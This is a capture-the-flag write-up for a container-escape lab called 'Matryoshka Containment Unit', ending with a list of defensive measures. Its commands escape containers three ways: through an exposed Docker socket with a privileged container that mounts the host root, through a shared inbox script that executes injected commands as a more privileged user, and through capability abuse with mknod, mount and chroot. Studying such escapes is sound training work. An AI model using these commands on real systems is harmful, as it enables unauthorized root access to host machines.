****Matryoshka Containment Unit****

You set up a containment unit designed to trap and contain even the most nefarious viruses, but you accidentally got trapped in it while testing it.

SSH login as matryoshka

**🔍 Enumeration Phase**
========================

<img width="542" height="212" alt="matryoshka_1_first_enum" src="https://github.com/user-attachments/assets/c3cbe6ff-3ded-4d90-8303-3caa14a3220b" />

```
ls -la /run/docker.sock
```
Details of the Docker socket file.

note: The Docker socket (/run/docker.sock) allows root-level access to the Docker daemon. If accessible inside a container, it can be exploited to control the host.

```
docker -H unix:///run/docker.sock version
```
Queried the Docker daemon version via the socket.

note: Confirmed that the container can communicate with the host’s Docker daemon, which is a major escape vector.


```
docker images
```
Available Docker images on the host.

<img width="549" height="192" alt="matryoshka_1_first_ps_image" src="https://github.com/user-attachments/assets/6da5d795-bb36-4cbc-acbc-969c78ab750b" />

note: Helps identify which images can be leveraged for privilege escalation or escape.

**🚪 First Escape**
===================
```
docker run -it -v /:/host --privileged alpine:3.20 chroot /host /bin/bash
Purpose: Runs a new container with:
```
-v /:/host → Mounts the host’s root filesystem inside the container.

--privileged → Grants full capabilities to the container.

chroot /host /bin/bash → Changes root to the host filesystem, effectively giving host-level shell access.

<img width="548" height="347" alt="matryoshka_1_first_escape" src="https://github.com/user-attachments/assets/124ec4d8-eea0-49b2-8c21-f715d1f6fdb0" />

note: This is a direct container escape method, allowing access to /root and other sensitive host directories.


**🚪 Second Escape**
====================
From the Hint
```
find / -type d -name inbox 2>/dev/null
```
Searched for a directory named inbox.
```
/mnt/level3share/inbox
```
Wrote a command into the inbox script, then retrieved its output from the outbox.

Examples
```
echo "id" > inbox/cmd.sh
cat outbox/cmd.sh.out

echo "ls -la /root" > inbox/cmd.sh
cat outbox/cmd.sh.out

echo "cat /root/flag_level3.txt" > inbox/cmd.sh
cat outbox/cmd.sh.out
```

**🚪 Third Escape (Capabilities Abuse)**
=========================================
Checked capabilities.
```
cat /proc/self/status | grep -i cap
```
Result:
```
CapInh:	0000000000000000
CapPrm:	00000000a82c35fb
CapEff:	00000000a82c35fb
CapBnd:	00000000a82c35fb
CapAmb:	0000000000000000
```
Decoded the capability mask.
```
capsh --decode=00000000a82c35fb
```
Result:
```
0x00000000a82c35fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_admin,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap
```
- Revealed which privileged operations were allowed (e.g., mounting filesystems, ptrace, sys_admin)
- Confirmed elevated privileges like cap_sys_admin, cap_sys_chr


```
lsblk
```
- block device
- Identified host disks/partitions available for mounting.


```
mkdir /mnt/host_root
```
- created mounting point
- Created a block device node for the host partition.

```
mknod /dev/nvme0n1p1 b 259 2
```
- Needed to access raw disk partitions from inside the container.

```
mount /dev/nvme0n1p1 /mnt/host_root/
```
- Mounted the host’s root partition.
- Granted direct access to host filesystem.

```
chroot /mnt/host_root
```
- Changed root to the mounted host filesystem.
- Provides a full host shell, completing the escape.

<img width="546" height="289" alt="matryoshka_1_final_root" src="https://github.com/user-attachments/assets/623a358c-5626-4280-90e0-de5a7926dca2" />

**🛡️ Defensive Approaches**
===========================
- Restrict Docker Socket Access
- Never mount /run/docker.sock into containers unless absolutely necessary.
- Use rootless Docker where possible.
- Drop unnecessary capabilities (--cap-drop=ALL and selectively add only required ones).
- Avoid --privileged containers.
- Do not mount sensitive host directories (/, /root, /etc) into containers.
- Use read-only mounts if needed.
- Monitor for unusual container activity (e.g., attempts to mount host partitions).
- Audit Docker API usage.
- Apply SELinux/AppArmor profiles to restrict container actions.
- Use tools like gVisor or Kata Containers for stronger isolation.
